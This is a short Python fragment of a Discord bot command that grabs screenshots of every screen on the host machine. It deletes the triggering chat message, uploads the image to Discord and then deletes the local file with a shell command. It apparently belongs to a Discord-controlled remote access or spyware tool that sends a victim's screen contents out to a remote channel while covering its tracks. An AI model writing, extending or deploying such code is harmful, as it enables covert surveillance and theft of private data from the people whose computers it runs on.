import subprocess
from PIL import ImageGrab

@client.command(name="ss")
async def screenshot(ctx):
    ImageGrab.grab(all_screens=True).save('ss.png')
    await ctx.message.delete()
    await ctx.send(embed=discord.Embed(title=current_time() + '`[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'ss.png'), mention_author=False)
    subprocess.run(f'del /s ss.png', shell=True)